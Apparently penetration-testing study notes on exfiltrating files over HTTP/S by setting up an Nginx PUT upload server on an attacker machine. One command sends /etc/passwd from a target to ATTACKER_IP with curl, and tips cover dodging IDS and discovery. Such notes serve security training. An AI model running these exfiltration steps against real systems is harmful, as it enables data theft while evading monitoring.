# Catching Files over HTTP/S

## Why HTTP/S for File Transfers

- Most **firewalls allow HTTP/HTTPS** outbound → least likely to be blocked
- HTTPS = **encrypted in transit** → avoids IDS alerts on sensitive data
- Apache vs Nginx: **Nginx preferred** for upload servers — simpler config, no PHP execution risk

---

## Nginx Upload Server Setup (PUT method)

### Full Setup Steps

```bash
# 1. Create upload directory
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2. Set ownership to web server user
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 3. Create Nginx config
sudo nano /etc/nginx/sites-available/upload.conf
```

Config content:

```
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
# 4. Enable the site
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# 5. Remove default config if port 80 conflict
sudo rm /etc/nginx/sites-enabled/default

# 6. Start Nginx
sudo systemctl restart nginx.service

# 7. Check for errors
tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80          # check what's using port 80
ps -ef | grep <PID>         # identify the process
```

---

## Upload File to Nginx Server

```bash
# From target — send file via HTTP PUT
curl -T /etc/passwd http://ATTACKER_IP:9001/SecretUploadDirectory/users.txt

# Verify on attacker
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

---

## Security Notes

| Risk | Nginx | Apache |
| --- | --- | --- |
| PHP execution of uploads | ❌ Not default | ✅ Easy to misconfigure |
| Directory listing | ❌ Off by default | ✅ On by default (dangerous) |
| Web shell execution risk | Low | Higher |
- **Never enable directory listing** on upload server — exposes all uploaded (sensitive) files
- Nginx won't execute PHP by default → uploaded web shells are **inert**
- Use a **non-standard port** (like 9001) to reduce visibility
- Use **SecretUploadDirectory** naming or randomized paths → harder to discover

---

## Quick Comparison: Upload Server Options

| Method | Tool | Best For |
| --- | --- | --- |
| `python3 -m uploadserver` | Python | Quick, simple, HTTP |
| `python3 -m uploadserver 443 --server-certificate` | Python | HTTPS with self-signed cert |
| Nginx + PUT | Nginx | Persistent, more robust |
| Apache | Apache | ⚠️ Use with caution — PHP risk |

---

## Key Takeaways

- HTTP/S = **most reliable transfer channel** — almost always allowed through firewalls
- Nginx is safer than Apache for upload servers due to **no default PHP execution**
- Always **disable directory listing** — your uploaded files are sensitive
- Use **curl -T** (PUT request) to upload to Nginx WebDAV-style endpoint
- Combine with **file encryption** (openssl/AES) before upload for full protection